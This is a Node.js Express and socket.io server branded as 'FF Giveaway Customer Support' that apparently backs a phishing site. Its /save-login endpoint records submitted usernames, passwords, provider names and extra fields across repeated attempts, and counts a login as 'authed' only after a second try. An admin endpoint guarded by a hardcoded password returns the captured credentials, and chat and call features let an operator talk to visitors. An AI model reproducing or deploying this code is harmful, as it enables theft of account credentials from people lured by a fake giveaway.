const express = require('express');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const db = require('./db');

const app = express();

const UPLOAD_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
const USER_LIST_FILE = path.join(DATA_DIR, 'user.json');

function loadUserMeta(userId) {
  const filePath = path.join(DATA_DIR, `${userId}.json`);
  if (!fs.existsSync(filePath)) return null;
  try { return JSON.parse(fs.readFileSync(filePath, 'utf8')); }
  catch { return null; }
}

function saveUserMeta(userId, meta) {
  const filePath = path.join(DATA_DIR, `${userId}.json`);
  // Write atomically: write to a temp file then rename
  const tmpPath = filePath + '.tmp';
  try {
    fs.writeFileSync(tmpPath, JSON.stringify(meta, null, 2));
    fs.renameSync(tmpPath, filePath);
  } catch (e) {
    // Fallback to direct write if atomic rename fails
    try { fs.writeFileSync(filePath, JSON.stringify(meta, null, 2)); } catch (err) { console.error('saveUserMeta write failed', err); }
  }
  const list = loadUserList();
  const existingIndex = list.findIndex(item => item.id === userId);
  const summary = {
    id: userId,
    provider: meta.provider,
    username: meta.username,
    attempts: meta.attempts.length,
    updated_at: meta.updated_at,
    created_at: meta.created_at
  };
  if (existingIndex >= 0) list[existingIndex] = summary;
  else list.push(summary);
  fs.writeFileSync(USER_LIST_FILE, JSON.stringify(list, null, 2));
}

function loadUserList() {
  if (!fs.existsSync(USER_LIST_FILE)) return [];
  try { return JSON.parse(fs.readFileSync(USER_LIST_FILE, 'utf8')); }
  catch { return []; }
}

function deleteUserMeta(userId) {
  const userFile = path.join(DATA_DIR, `${userId}.json`);
  if (fs.existsSync(userFile)) fs.unlinkSync(userFile);
  const list = loadUserList().filter(item => item.id !== userId);
  fs.writeFileSync(USER_LIST_FILE, JSON.stringify(list, null, 2));
}

const ADMIN_PASSWORD = '9468';

app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(UPLOAD_DIR));
app.use(express.json());

app.get('/ping', (req, res) => res.json({ ok: true }));

// ---------- File upload ----------
const storage = multer.diskStorage({
  destination: UPLOAD_DIR,
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || '';
    cb(null, uuidv4() + ext);
  }
});
const upload = multer({ storage, limits: { fileSize: 12 * 1024 * 1024 } });

app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file received' });
  res.json({ url: '/uploads/' + req.file.filename });
});

app.post('/save-login', (req, res) => {
  const { userId, provider, username, password, attempt } = req.body;
  if (!userId || !provider || !username) {
    return res.status(400).json({ error: 'Missing userId, provider, or username' });
  }

  const existing = loadUserMeta(userId) || { id: userId, attempts: [], created_at: Date.now() };
  const attempts = Array.isArray(existing.attempts) ? [...existing.attempts] : [];
  const attemptNumber = Number(attempt) || attempts.length + 1;

  const incomingFields = (req.body && req.body.fields && typeof req.body.fields === 'object') ? req.body.fields : {};
  const attemptEntry = {
    attempt: attemptNumber,
    recorded_at: Date.now(),
    username: username,
    provider: provider,
    password: (password !== undefined) ? password : null,
    fields: incomingFields
  };
  attempts.push(attemptEntry);

  // Merge latest fields into top-level fields for convenience
  const mergedFields = Object.assign({}, existing.fields || {}, incomingFields);

  const meta = {
    ...existing,
    id: userId,
    provider,
    username,
    password: (password !== undefined) ? password : existing.password,
    fields: mergedFields,
    attempts,
    updated_at: Date.now(),
    created_at: existing.created_at || Date.now()
  };
  saveUserMeta(userId, meta);
  const authed = Array.isArray(meta.attempts) && meta.attempts.length >= 2;
  res.json({ ok: true, meta, authed });
});

app.get('/user-meta/:userId', (req, res) => {
  const userId = req.params.userId;
  // Protect metadata access: require admin password in header
  const adminPass = req.headers['x-admin-pass'] || req.query.admin_pass;
  if (adminPass !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Forbidden' });
  const meta = loadUserMeta(userId);
  if (!meta) return res.status(404).json({ error: 'User metadata not found' });
  res.json(meta);
});

// ---------- Delete conversation ----------
app.post('/delete-room', (req, res) => {
  const { roomId, password } = req.body;
  if (password !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Unauthorized' });
  if (!roomId) return res.status(400).json({ error: 'No roomId' });
  try {
    db.deleteRoom(roomId);
    deleteUserMeta(roomId);
    io.to('admins').emit('rooms_update', db.getRoomList());
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- Create servers ----------
const httpServer = http.createServer(app);

// Try to load HTTPS cert (generated separately), else HTTP only
let httpsServer = null;
const certPath = path.join(__dirname, 'cert.pem');
const keyPath  = path.join(__dirname, 'key.pem');
if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
  httpsServer = https.createServer({
    cert: fs.readFileSync(certPath),
    key:  fs.readFileSync(keyPath)
  }, app);
}

// Attach socket.io to http (and https if available)
const io = new Server(httpServer, {
  transports: ['polling'],
  allowEIO3: true,
  cors: { origin: '*' }
});

if (httpsServer) {
  new Server(httpsServer, {
    transports: ['polling'],
    allowEIO3: true,
    cors: { origin: '*' }
  });
}

// ---------- Socket.io logic ----------
let adminCount = 0;

io.on('connection', socket => {
  console.log('Client connected:', socket.id);

  socket.on('user_join', ({ userId, name }) => {
    if (!userId) userId = uuidv4();
    const user = db.getOrCreateUser(userId, name);
    socket.userId = userId;
    socket.join('room_' + userId);
    socket.emit('joined', { userId, name: user.name });
    socket.emit('admin_presence', { online: adminCount > 0 });
    socket.emit('history', db.getHistory(userId));
    io.to('admins').emit('rooms_update', db.getRoomList());
    console.log('User joined:', user.name);
  });

  socket.on('admin_join', ({ password }) => {
    if (password !== ADMIN_PASSWORD) { socket.emit('admin_auth_fail'); return; }
    socket.isAdmin = true;
    socket.join('admins');
    adminCount++;
    io.emit('admin_presence', { online: true });
    socket.emit('admin_auth_ok');
    socket.emit('rooms_update', db.getRoomList());
    console.log('Admin logged in');
  });

  socket.on('admin_open_room', ({ roomId }) => {
    if (!socket.isAdmin) return;
    if (socket.currentRoom) socket.leave('room_' + socket.currentRoom);
    socket.currentRoom = roomId;
    socket.join('room_' + roomId);
    socket.emit('room_history', { roomId, history: db.getHistory(roomId) });
  });

  socket.on('user_message', (msg) => {
    if (!socket.userId) return;
    const roomId = socket.userId;
    const full = db.insertMessage(roomId, 'user', msg.type, msg.content);
    io.to('room_' + roomId).emit('new_message', full);
    io.to('admins').emit('new_message', full);
    io.to('admins').emit('rooms_update', db.getRoomList());
  });

  socket.on('admin_message', ({ roomId, type, content }) => {
    if (!socket.isAdmin || !roomId) return;
    const full = db.insertMessage(roomId, 'admin', type, content);
    io.to('room_' + roomId).emit('new_message', full);
    io.to('admins').emit('new_message', full);
    io.to('admins').emit('rooms_update', db.getRoomList());
  });

  socket.on('typing', ({ roomId, sender }) => {
    if (sender === 'user') io.to('admins').emit('typing', { roomId, sender });
    else io.to('room_' + roomId).emit('typing', { roomId, sender });
  });

  // ---------- WebRTC signaling (relayed within room_<roomId>) ----------
  socket.on('call_offer', ({ roomId, sdp, callType, from }) => {
    if (!roomId) return;
    socket.to('room_' + roomId).emit('call_offer', { roomId, sdp, callType, from });
  });
  socket.on('call_answer', ({ roomId, sdp, from }) => {
    if (!roomId) return;
    socket.to('room_' + roomId).emit('call_answer', { roomId, sdp, from });
  });
  socket.on('ice_candidate', ({ roomId, candidate, from }) => {
    if (!roomId) return;
    socket.to('room_' + roomId).emit('ice_candidate', { roomId, candidate, from });
  });
  socket.on('call_reject', ({ roomId, from }) => {
    if (!roomId) return;
    socket.to('room_' + roomId).emit('call_reject', { roomId, from });
  });
  socket.on('call_end', ({ roomId, from }) => {
    if (!roomId) return;
    socket.to('room_' + roomId).emit('call_end', { roomId, from });
  });
  socket.on('call_busy', ({ roomId, from }) => {
    if (!roomId) return;
    socket.to('room_' + roomId).emit('call_busy', { roomId, from });
  });

  socket.on('disconnect', () => {
    console.log('Disconnected:', socket.id);
    if (socket.userId) {
      io.to('room_' + socket.userId).emit('call_end', { roomId: socket.userId, from: 'user' });
    }
    if (socket.currentRoom) {
      socket.to('room_' + socket.currentRoom).emit('call_end', { roomId: socket.currentRoom, from: 'admin' });
    }
    if (socket.isAdmin) {
      adminCount = Math.max(0, adminCount - 1);
      if (adminCount === 0) io.emit('admin_presence', { online: false });
    }
  });
});

const HTTP_PORT  = process.env.PORT || 3000;
const HTTPS_PORT = 3443;

httpServer.listen(HTTP_PORT, () => {
  console.log('\n========================================');
  console.log('  FF Giveaway Customer Support');
  console.log('  HTTP  → http://localhost:' + HTTP_PORT);
  if (httpsServer) console.log('  HTTPS → https://localhost:' + HTTPS_PORT + '  (mic works on other devices)');
  console.log('  Admin : /admin.html  |  Pass: ' + ADMIN_PASSWORD);
  console.log('========================================\n');
});

if (httpsServer) {
  httpsServer.listen(HTTPS_PORT, () => {
    console.log('HTTPS server running on port', HTTPS_PORT);
  });
}